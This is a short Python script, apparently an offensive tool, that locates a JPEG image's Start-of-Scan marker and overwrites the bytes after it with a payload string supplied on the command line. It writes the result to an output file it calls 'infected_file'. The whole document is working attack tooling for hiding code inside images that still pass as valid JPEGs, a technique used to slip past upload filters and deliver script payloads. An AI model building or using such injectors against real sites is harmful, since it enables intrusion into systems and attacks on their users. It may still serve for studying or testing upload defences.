#!/usr/bin/python3
import sys
import binascii
import os

SOS_MARKER = "FFDA"
BIN_SOS_MARKER = binascii.unhexlify(SOS_MARKER)
MAGIC_NUMBER = "00 0c 03 01 00 02 11 03 11 00 3F 00".replace(" ", "")
BIN_MAGIC_NUMBER = binascii.unhexlify(MAGIC_NUMBER)

def main():
    path_to_vector_image = sys.argv[1]
    payload_code = sys.argv[2]
    path_to_output = sys.argv[3]

    with open(path_to_vector_image, 'rb') as vector_file:
        bin_vector_data = vector_file.read()

        print("[ ] Searching for magic number...")
        sos_marker_index = find_sos_marker_index(bin_vector_data)
        print("[ ] SOS Marker index:", sos_marker_index)
        if sos_marker_index >=0:
            print("[+] Found SOS Marker.")
            with open(path_to_output, 'wb') as infected_file:
                print("[ ] Injecting payload...")
                infected_file.write(
                    inject_payload(
                        bin_vector_data,
                        sos_marker_index,
                        payload_code))
                print("[+] Payload written.")
        else:
            print("[-] Magic number not found. Exiting.")

def find_sos_marker_index(
        data: bytes) -> int:
    return data.find(BIN_SOS_MARKER)

def inject_payload(
        vector: bytes,
        index: int,
        payload: str) -> bytes:

    bin_payload = payload.encode()

    pre_payload = vector[:index + 14]
    post_payload = vector[index + 14 + len(bin_payload):]

    return (pre_payload + bin_payload + post_payload)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("USAGE: <jpeg file path> <payload code> <output path>")
    else:
        main()
